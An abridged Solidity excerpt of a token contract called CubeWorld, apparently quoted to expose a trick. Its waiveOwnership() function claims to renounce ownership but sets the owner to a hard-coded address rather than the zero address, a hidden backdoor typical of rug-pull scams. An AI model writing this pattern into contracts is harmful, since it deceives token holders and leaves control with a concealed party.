...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xD614811f67dFD5c74ea400A18BeBF220B00696d6);
    }
...
contract CubeWorld is Context, IERC20, Ownable {
    ...
    string private _name = "CubeWorld";
    string private _symbol = "Cube";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xd0993D6611E57F7304d459f057f786fbA3B487E1);
    address payable public teamWalletAddress = payable(0xd0993D6611E57F7304d459f057f786fbA3B487E1);
